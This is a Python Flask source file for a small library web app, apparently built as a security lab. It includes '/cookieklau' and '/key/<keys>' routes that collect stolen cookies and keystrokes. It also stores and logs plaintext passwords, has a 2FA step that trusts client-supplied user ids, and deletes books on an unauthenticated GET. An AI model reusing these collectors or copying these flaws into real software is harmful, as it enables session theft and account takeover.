from library import app, db, totp
from flask import render_template, request, redirect, url_for, session
from sqlalchemy import text

loginAttempts = {}

@app.route('/')
def home():
    benutzername = get_benutzername(request)
    print(f"Recieved request for home page with benutzername {benutzername}")
    return render_template('home.html', benutzername=benutzername)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.remote_addr in loginAttempts:
            loginAttempts[request.remote_addr] += 1
        else:
            loginAttempts[request.remote_addr] = 1
        
        if loginAttempts[request.remote_addr] > 3:
            print(f"Too many login attempts from {request.remote_addr}. Blocking further attempts.")
            return render_template('login.html', error="Too many login attempts. Please try again later."), 429
        benutzername = request.form['username']
        password = request.form['password']
        # Here you would typically check the benutzername and password against a database
        print(f"Recieved login request for {benutzername} with password {password}")

        query = f"SELECT * FROM benutzer WHERE benutzername=:p1 AND passwort=:p2"
        params = {"p1": benutzername, "p2": password}
        result = db.session.execute(text(query), params).fetchall()
        print(f"Query result: {result}")
        if len(result) == 1:
            # Assuming the user is authenticated successfully
            if request.remote_addr in loginAttempts:
                del loginAttempts[request.remote_addr]
            resp = render_template('2fa.html', benutzername=result[0][1], benutzerId=result[0][0])
            # resp.set_cookie('benutzername', result[0][1])  # Set a cookie with the benutzername
            # resp.set_cookie('benutzerId', str(result[0][0]))  # Set a cookie with the benutzerId
            return resp
        # if len(result) > 1:
        #     resp = redirect(url_for('home'))
        #     print(f"{str(result)}")
        #     resp.set_cookie('benutzername', str(result))
        #     return resp

        
        return render_template('login.html', error="Wrong password. Try again."), 400
    
    # If the request method is GET, just render the login page
    return render_template('login.html', benutzername=get_benutzername(request)), 200

@app.route('/2fa', methods=['POST'])
def twoFA():
    if request.method == 'POST':
        benutzername = request.form['2fa_benutzername']
        benutzerId = request.form['2fa_benutzerId']
        token = request.form['twoFA']

        # Validate the TOTP token
        if totp.verify(token):      # If not worky, try syncing windows time again
            resp = redirect(url_for('library'))
            # resp.set_cookie('benutzername', benutzername)
            # resp.set_cookie('benutzerId', str(benutzerId))
            session['benutzername'] = benutzername
            session['benutzerId'] = str(benutzerId)
            return resp
        else:
            print(f"Invalid 2FA token for user {benutzername}")
            return render_template('2fa.html', error="Invalid 2FA token. Please try again.",benutzername=benutzername, benutzerId=benutzerId), 400
    
    return render_template('2fa.html', benutzername=request.args.get('benutzername'), benutzerId=request.args.get('benutzerId')), 200

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        benutzername = request.form['username']
        password = request.form['password']
        # Here you would typically save the new user to a database
        print(f"Recieved registration request for {benutzername} with password {password}")

        query = f"SELECT * FROM benutzer WHERE benutzername=:p1"
        params = {"p1": benutzername}
        result = db.session.execute(text(query), params).fetchall()
        print(f"Query result: {result}")

        if len(result) == 0:
            # Assuming the user is registered successfully
            insert_query = f"INSERT INTO benutzer (benutzername, passwort) VALUES (:p1, :p2)"
            params = {"p1": benutzername, "p2": password}
            db.session.execute(text(insert_query), params)
            db.session.commit()
            return redirect(url_for('login'))
        
        redirect(url_for('register'))
    
    # If the request method is GET, just render the register page
    return render_template('register.html')

@app.route('/logout')
def logout():
    resp = redirect(url_for('home'))
    # resp.set_cookie('benutzerId', '', expires=0)  # Clear the cookie
    # resp.set_cookie('benutzername', '', expires=0)  # Clear the cookie
    session.pop('benutzername', None)  # Clear the session
    session.pop('benutzerId', None)
    return resp

@app.route('/library')
def library():
    benutzername = get_benutzername(request)
    
    query = f"SELECT * FROM buch"
    result = db.session.execute(text(query)).fetchall()

    if len(result) == 0:
        print(f"No books found for user {benutzername}")
        return render_template('library.html', benutzername=benutzername, books=[])
    
    print(f"Recieved request for library page with benutzername {benutzername} and books {result}")
    return render_template('library.html', benutzername=benutzername, books=result)

@app.route('/more_info')
def more_info():
    benutzername = get_benutzername(request)
    buchid = request.args.get('bookId')
    
    query = f"SELECT * FROM buch WHERE buchid = :p1"
    params = {"p1": buchid}
    result = db.session.execute(text(query), params).fetchall()
    print(f"Query result: {result}")

    if len(result) == 0:
        print(f"No book found with id {buchid}")
        return render_template('more_info.html', benutzername=benutzername, book=None)
    
    print(f"Recieved request for more info page with benutzername {benutzername} and book {result[0]}")
    return render_template('more_info.html', benutzername=benutzername, book=result[0])

@app.route('/cookieklau')
def cookie_klau():
    stolen_cookies = request.args.get('cookies')
    print(f"Recieved request to steal cookies: {stolen_cookies}")
    return render_template('home.html')  # This is just a placeholder response

@app.route('/key/<keys>')
def key(keys):
    print(f"Recieved request for key with keys {keys}")
    with open('keys.txt', 'a') as f:
        f.write(keys + '\n')
    return render_template('home.html')

@app.route('/addBook', methods=['POST'])
def add_book():
    query = f"INSERT INTO buch (titel, author, jahr, beschreibung, genre, benutzerId) VALUES (:p1, :p2, :p3, :p4, :p5, :p6)"
    params = {
        "p1": request.form['title'], 
        "p2": request.form['author'], 
        "p3": request.form['year'], 
        "p4": request.form['description'], 
        "p5": request.form['genre'], 
        "p6": session['benutzerId']
    }
    result = db.session.execute(text(query), params)
    db.session.commit()
    print(f"Query result: {result}")
    print(f"Recieved request to add book with title {request.form['title']} and author {request.form['author']}")
    print(f"Book added successfully with id {result.lastrowid}")
    return redirect(url_for('library'))

@app.route('/deleteBook', methods=['GET'])
def delete_book():
    query = f"DELETE FROM buch WHERE buchid = :p1"
    params = {"p1": request.args.get('bookId')}
    db.session.execute(text(query), params)
    db.session.commit()
    print(f"Recieved request to delete book with id {request.args}")
    return redirect(url_for('library'))

def get_benutzername(request):
    benutzername = session['benutzername'] if 'benutzername' in session else None
    print(f"Recieved request for library page with benutzername {benutzername}")
    if benutzername is None:
        return 'Guest'
    return benutzername